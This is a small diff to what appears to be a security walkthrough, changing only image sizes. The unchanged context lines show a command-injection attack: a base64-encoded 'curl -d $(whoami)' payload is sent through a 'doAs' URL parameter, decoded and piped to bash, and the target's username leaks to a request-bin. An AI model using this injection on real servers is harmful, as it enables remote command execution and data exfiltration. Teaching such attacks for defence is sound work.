@@ -200,7 +200,7 @@ import base64
 base64.b64encode(b'curl -d $(whoami) <REQUEST-BIN-URL>')
 ```
 
-<img src="./assets/python_encode.png" width=900 height=150>
+<img src="./assets/python_encode.png" width=900 height=50>
 
 
 ```
@@ -209,7 +209,7 @@ curl -X "GET" http://<IP>:8080/?doAs=`echo <base_64_string> | base64 -d | bash`
 
 We can see that we have got two GET requests in our Request Bin logger. One of this contains the target username:
 
-<img src="./assets/username.png" width=800 height=350>
+<img src="./assets/username.png" width=800 height=400>
 
 # Further reading
 
